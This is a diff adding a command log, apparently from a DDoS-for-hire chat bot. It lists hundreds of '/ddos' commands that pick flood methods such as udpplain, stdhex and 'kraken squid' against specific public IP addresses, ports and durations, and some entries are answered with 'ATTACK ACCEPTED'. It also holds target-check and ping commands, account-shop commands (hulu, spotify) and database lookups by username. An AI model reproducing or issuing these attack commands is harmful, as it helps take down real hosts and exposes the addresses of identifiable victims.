@@ -1,0 +1,243 @@
+/methods
+/ddos udp 20.184.251.126 20 dport=30012
+/ddos udpplain 20.184.251.126 20 dport=30012
+/ddos udpplain 20.184.251.126 60 dport=30012
+/ddos udp 20.184.251.126 20 dport=30012
+/ddos udpplain 20.184.251.126 40 dport=30012
+/ddos udpplain 20.184.251.126 40 dport=30012
+/ddos udpplain 20.184.251.126 60 dport=30012
+/ddos udpplain 13.87.157.187 60 dport=30002
+/ddos udpplain 13.87.157.187 60 dport=30002
+/ddos udpplain 13.87.157.187 60 dport=30002
+/ddos udpplain 13.64.24.187 80 dport=30105
+/ddos udpplain 20.184.243.186 80 dport=30021
+/ddos udpplain 74.201.107.25 80 dport=35066
+/ddos udpplain 20.184.251.126 80 dport=30234
+/ddos udpplain 20.184.251.126 80 dport=30234
+/ddos udpplain 20.184.243.186 80 dport=30017
+/ddos udpplain 20.184.243.186 80 dport=30017
+/ddos udpplain 13.64.24.187 80 dport=30032
+/ddos udpplain 13.83.64.97 80 dport=30107
+/ddos udpplain 13.83.64.97 80 dport=30107
+/ddos udp 20.184.243.186 80 dport=30203
+/ddos udp 20.184.251.239 80 dport=30231
+/ddos udp 20.184.251.239 80 dport=30231
+/ddos udpplain 20.184.251.126 80 dport=30008
+/ddos udpplain 20.184.251.126 80 dport=30008
+/vpn
+/ddos udpplain 13.83.249.5 60 dport=30218
+/ddos udpplain 13.83.249.5 60 dport=30218
+/ddos udp 73.208.173.162 80 dport=80
+/checkip 166.62.110.72
+/methods
+/ddos tcp 166.62.110.72 60 dport=80
+/ddos udp 45.86.15.221 80 dport=80
+/ping 45.86.15.221
+/ddos udpplain 13.64.24.187 60 dport=30034
+/ddos udpplain 13.64.24.187 60 dport=30034
+/ddos udpplain 20.184.251.239 60 dport=30117
+/methods
+/methods
+/info
+/ddos udpplain  20.184.251.126  60 dport=30013
+/ddos udpplain  20.184.251.126  60 dport=30013
+/tr4p
+/info
+/ddos udp 45.86.15.221 80 dport=80
+/ping 45.86.15.221
+/methods
+/ping 45.86.15.221
+/ddos udp 45.86.15.221 80 dport=80
+/ping 45.86.15.221
+/hulu
+/hulu
+/hulu
+/accounts
+/hulu
+/ddos udp 45.86.15.221 80 dport=80
+/checkip 45.86.15.221
+/accounts
+/spotify
+/checkip 3.127.79.86
+/checkip 187.190.237.67
+/ddos udpplain  20.184.252.172  60 dport=30003
+/ddos udpplain  20.184.252.172  60 dport=30003
+/ddos udp  20.184.252.172  80 dport=30003
+/ddos udp  20.184.252.172  80 dport=30003
+/ddos udpplain  20.184.252.172  80 dport=30003
+/ddos udpplain  20.184.252.172  80 dport=30003
+/bots
+/tr4p
+/tr4p
+/info
+/bots
+/ddos udpplain  20.189.125.209  80 dport=30030
+/ddos udpplain  13.88.76.149 80 dport=30104
+/checkip 13.86.240.108
+/ddos udpplain  13.86.239.112 80 dport=30019
+/ddos udpplain  13.86.239.112 80 dport=30019
+/checkip 45.86.15.221
+/ddos udp 45.86.15.221 120 dport=80
+/ddos udp 45.86.15.221 120 dport=80
+/ddos udp 45.86.15.221 120 dport=80
+/ping 45.86.15.221
+/ping 24.177.137.206
+/checkip 8.8.8.8
+/ping 45.86.15.221
+/ddos udp 45.86.15.221 120 dport=80
+/ping 45.86.15.221
+/plan
+/tr4p
+/ddos udp 45.86.15.221 120 dport=80
+/ping 45.86.15.221
+/plans
+/plan
+/ddos udp 45.86.15.221 120 dport=80
+/ping 45.86.15.221
+/ddos udp 45.86.15.221 120 dport=80
+/ping 45.86.15.221
+/ping 45.86.15.221
+/ddos udp 45.86.15.221 120 dport=80
+/ping 45.86.15.221
+/ping 45.86.15.221
+/method
+/tr4p
+/methods
+/ddos udpplain 13.86.240.108 80 dport=30006
+/methods
+/ddos udp 13.88.76.149 80 dport=30108
+/ddos udp 52.180.101.216 80 dport=30018
+/ddos udpplain 52.180.101.216 80 dport=30018
+/ddos udpplain 52.180.101.216 80 dport=30018
+/ddos udp 45.86.15.221 120 dport=80
+/ddos udp 117.60.236.147 120 dport=80
+/ping 117.60.236.147
+/ping 117.60.236.147
+/ping 117.60.236.147
+/plan
+/ddos udpplain 52.180.97.191 80 dport=30108
+/ddos udpplain 52.180.97.191 100 dport=30108
+/methods
+/ddos udpplain 52.180.97.191 10 dport=30108
+/ddos udpplain 52.180.97.191 1200 dport=30108
+/ddos udpplain 52.180.97.191 120 dport=30108
+/ddos udp 52.180.97.191 80 dport=30108
+/ddos udp 52.180.101.48 80 dport=30131
+/ddos udp 52.180.101.48 1200 dport=30131
+/ddos udp 66.190.77.87 1200 dport=53
+/ddos udp 52.180.101.48 1200 dport=30131
+/ddos udp 52.180.97.191 5 dport=30108
+/ddos udp 117.60.236.147 120 dport=80
+/ping 117.60.236.147
+/ddos udpplain 52.180.98.74 80 dport=30239
+/ddos udpplain 52.180.98.74 80 dport=30239
+/ddos udpplain 52.180.103.4 80 dport=30022
+/ddos udpplain 52.180.103.4 80 dport=30022
+/ddos udp 52.180.103.4 80 dport=30022
+/ddos udp 52.180.103.4 80 dport=30022
+/ddos udpplain 52.180.101.216 80 dport=30217
+/ddos udpplain 52.180.101.216 80 dport=30217
+/methodsd
+/methods
+/std 109.162.240.71 100 dport=80
+/ddos std 109.162.240.71 100 dport=80
+/ping 109.162.240.71
+/tr4p
+/info
+/ddos udpplain 109.162.240.71 120 dport=80
+/checkip 109.162.240.71
+/ddos std 109.162.240.71 120 dport=80
+/mega
+/checkip 175.141.63.192
+/dbshow
+/dbfind d1
+/ping 71.132.173.196
+/checkip 95.249.29.47
+/ddos std 95.249.29.47 100 dport=80
+/checkip 86.159.166.101
+/tr4p
+/methods
+/ddos udp 86.159.166.101 100 dport=80
+/ping 77.250.179.250
+/checkip 173.245.54.191
+/methods
+/ping 173.245.54.191
+/checkip 173.245.54.191
+/ddos udp 52.234.107.61 100 dport=30231
+/ddos udpplain 52.234.107.61 100 dport=30231
+/ddos udpplain 52.180.100.2 120 dport=30140
+/ping 37.187.228.225
+/dbsearch XLLENCY#6330
+/tr4p
+/dbshow 1
+/dbfind xprisn
+/dbsearch xprisn
+/ping 1.42.254.196
+/methods
+/ddos stdhex 52.180.99.251 80 dport=30204
+/ddos stdhex 52.234.93.171 70 dport=30018
+/ddos std 38.131.113.212 100 dport=80
+/ping 38.131.113.212
+/ddos stdhex 52.241.141.238 70 dport=30217
+/ddos stdhex 40.80.205.1 120 dport=30019
+/ddos stdhex 52.250.193.111 30 dport=30103
+/ddos stdhex 52.241.141.238 120 dport=30208
+/ddos stdhex 52.234.93.171 30 dport=30211
+/ddos stdhex 216.52.53.51 120 dport=31202
+/ddos stdhex 52.234.93.171 70 dport=30103
+/ddos stdhex 20.189.177.187 120 dport=30118
+/ddos udpplain 20.189.177.187 120 dport=30118
+/ddos stdhex 52.246.115.166 70 dport=30221
+/ddos stdhex 52.248.43.166 80 dport=30003
+/ddos std 20.189.177.187 80 dport=30022
+/ddos stdhex 52.246.115.166 90 dport=30213
+/ddos stdhex 52.234.91.147 100 dport=30203
+/ddos stdhex 52.250.193.111 70 dport=30211
+/ddos stdhex 52.180.102.158 70 dport=30210
+/ddos stdhex 52.180.102.158 100 dport=30030
+/ddos stdhex 52.250.195.105 80 dport=30226
+/ddos udp 52.180.102.227 100 dport=30118
+/ddos stdhex 52.143.255.71 100 dport=30030
+/ddos stdhex 52.250.195.105 100 dport=30033
+/ddos stdhex 52.234.105.248 100 dport=30002
+/tr4p
+/plan
+/ddos udp 172.9.195.42 120 dport=80
+/ddos std 117.27.239.28 120 dport=80
+/ddos udp 117.27.239.28 120 80
+/ddos stdhex 94.78.193.75 800 80
+/checkip 94.78.193.75
+/ddos stdhex 100.7.87.181 200 80
+/sms
+/planm
+/plan
+/ddos udp 96.40.178.239 100 80
+/plan
+/ddos kraken squid 98.34.84.94 1200
+/method
+/methods
+/ddos kraken 45.86.15.221 100 80
+/ddos kraken std 45.86.15.221 100 80
+/method
+/checkip 45.86.15.221
+/ddos kraken squid 45.86.15.221 120 80
+/ddos Godzilla vse 35.187.132.103 120 80
+[Thu Aug 27 2020 10:37:28 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 45.86.15.221 120 80
+[Thu Aug 27 2020 10:37:45 GMT-1100 (Samoa Standard Time)] /captcha
+[Thu Aug 27 2020 10:37:59 GMT-1100 (Samoa Standard Time)] /captcha reset
+[Thu Aug 27 2020 10:38:18 GMT-1100 (Samoa Standard Time)] /captcha answer 101
+[Thu Aug 27 2020 10:38:38 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 45.86.15.221 120 80
+[Thu Aug 27 2020 10:38:38 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 10:41:44 GMT-1100 (Samoa Standard Time)] /tr4p
+[Thu Aug 27 2020 10:42:39 GMT-1100 (Samoa Standard Time)] /checkip 75.139.225.228
+[Thu Aug 27 2020 10:43:07 GMT-1100 (Samoa Standard Time)] /methods
+[Thu Aug 27 2020 10:49:29 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 75.139.225.228 600 80
+[Thu Aug 27 2020 10:49:29 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 10:50:21 GMT-1100 (Samoa Standard Time)] /ping 75.139.225.228
+[Thu Aug 27 2020 10:53:01 GMT-1100 (Samoa Standard Time)] /ping 75.139.225.228
+[Thu Aug 27 2020 10:54:18 GMT-1100 (Samoa Standard Time)] /ping 75.139.225.228
+[Thu Aug 27 2020 11:05:55 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 75.139.225.228 1200 80
+[Thu Aug 27 2020 11:05:55 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
+[Thu Aug 27 2020 11:06:21 GMT-1100 (Samoa Standard Time)] /ping 75.139.225.228
+[Thu Aug 27 2020 12:25:52 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 75.139.225.228 1800 80
+[Thu Aug 27 2020 12:25:52 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
